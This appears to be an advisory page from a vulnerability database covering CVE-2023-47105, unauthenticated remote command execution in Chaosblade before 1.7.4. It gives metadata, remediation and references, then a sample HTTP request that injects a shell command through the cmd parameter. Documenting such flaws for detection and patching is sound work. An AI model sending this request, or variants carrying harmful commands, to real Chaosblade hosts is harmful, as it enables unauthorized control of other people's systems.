---
layout: post
cve_id: CVE-2023-47105
title: Chaosblade < 1.7.4 - Remote Code Execution
pcap: true
pcap_path: /pcaps/2023/CVE-2023-47105.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-47105.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: high
impact: 'This vulnerability allows unauthenticated attackers to remotely invoke the
  HTTP service and execute arbitrary commands on any Chaosblade instance with server
  mode enabled. This could lead to unauthorized access and control over the host system
  running Chaosblade.

  '
remediation: Fixed in 1.7.4
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2023-47105
- https://github.com/advisories/GHSA-723h-x37g-f8qm
- https://github.com/chaosblade-io/chaosblade/blob/0a07380c9899febb2b544132783b376b44226cca/exec/os/executor.go#L68
- https://narrow-oatmeal-0c0.notion.site/ChaosBlade-Remote-Command-Execution-CVE-2023-47105-4f5459046488436caaec2bced6ff26d7
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L
  cvss-score: 8.6
  cve-id: CVE-2023-47105
  cwe-id: CWE-78
  epss-score: 0.19961
  epss-percentile: 0.95269
metadata:
  verified: true
  max-request: 1
  vendor: chaosblade-io
  product: chaosblade
tags:
- cve
- cve2023
- chaosblade
- rce
- vkev
- vuln
---

## ðŸ” Vulnerability Description
exec.CommandContext in Chaosblade 0.3 through 1.7.3, when server mode is used, allows OS command execution via the cmd parameter without authentication.


## ðŸŒ HTTP Request
```nohighlight
GET /chaosblade?cmd=$(id) HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:141.0) Gecko/20100101 Firefox/141.0
Connection: close
Accept-Encoding: gzip
```

